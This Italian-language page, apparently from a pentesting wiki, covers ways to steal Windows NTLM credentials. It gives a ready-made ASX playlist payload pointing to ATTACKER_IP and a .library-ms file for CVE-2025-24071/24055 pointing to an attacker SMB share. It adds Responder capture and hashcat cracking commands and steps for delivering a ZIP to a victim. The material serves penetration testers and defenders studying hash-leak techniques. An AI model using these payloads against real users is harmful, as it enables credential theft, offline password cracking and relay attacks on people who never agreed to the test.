# Luoghi per rubare NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Controlla tutte le ottime idee da [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) dal download di un file Microsoft Word online fino alla fonte dei ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a far aprire o visualizzare in anteprima a un target una playlist di Windows Media Player che controlli, puoi leakare Net‑NTLMv2 puntando la voce a un percorso UNC. WMP tenterà di recuperare il media referenziato via SMB e si autenticherà implicitamente.

Esempio di payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flusso di raccolta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestisce in modo insicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della library punta a un percorso UNC remoto (es., \\attacker\share), semplicemente sfogliare/avviare il .library-ms all'interno dello ZIP fa sì che Explorer enumeri l'UNC e invii l'autenticazione NTLM all'attaccante. Questo produce un NetNTLMv2 che può essere cracked offline o potenzialmente relayed.

Esempio minimale di .library-ms che punta a un UNC dell'attaccante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Passaggi operativi
- Crea il file .library-ms con l'XML sopra (imposta il tuo IP/hostname).
- Comprimi in ZIP (on Windows: Send to → Compressed (zipped) folder) e consegna lo ZIP al target.
- Avvia un listener per la cattura NTLM e attendi che la vittima apra il .library-ms dall'interno dello ZIP.


## Riferimenti
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
